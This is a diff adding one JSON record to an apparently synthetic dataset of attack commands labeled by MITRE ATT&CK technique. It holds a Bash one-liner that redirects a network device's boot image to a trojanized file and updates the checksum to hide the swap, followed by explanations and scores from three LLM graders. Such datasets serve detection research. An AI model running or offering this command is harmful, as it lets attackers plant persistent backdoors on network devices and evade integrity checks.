@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "ln -sf /bootflash/trojan.img /bootflash/active.img && sync && md5sum /bootflash/active.img > /etc/firmware/active.img.md5",
+  "explanation": "Redirects the boot image symlink to a malicious image and updates its checksum file to mask the redirection.",
+  "rationale_steps": [
+    "Change the symlink target to point at the trojanized image",
+    "Flush filesystem metadata updates",
+    "Recompute and store MD5 to fit the new target image"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-3f5b9fd2-c6e10e24",
+  "source_prompt_hash": "3f5b9fd2",
+  "timestamp_utc": "2025-09-30T04:34:26.844102Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), valid flags (-sf), and correct syntax for all operations including symbolic linking, synchronizing the filesystem, and generating an MD5 checksum.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1601 (Modify System Image) by replacing a legitimate boot image with a malicious one via symlink redirection, forcing synchronization to persist changes, and updating the checksum file to evade integrity checks.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T17:08:12.084114Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid commands, flags, paths, redirection, and logical command separators.",
+        "semantic_score": 3,
+        "semantic_justification": "The command uses appropriate tools and methods to achieve the claimed intent of redirecting a boot image symlink and updating its checksum for T1601; however, the specified 'Privilege: None' would prevent successful execution in a realistic network device environment.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T17:08:27.744577Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with valid ln -sf usage, correct && chaining, and proper output redirection; no quoting or flag issues.",
+        "semantic_score": 4,
+        "semantic_justification": "Plausibly repoints a boot image symlink and regenerates a checksum consistent with T1601, but it assumes root-level permissions and specific platform paths/behaviors that may not universally hold on network devices.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T17:08:38.313707Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
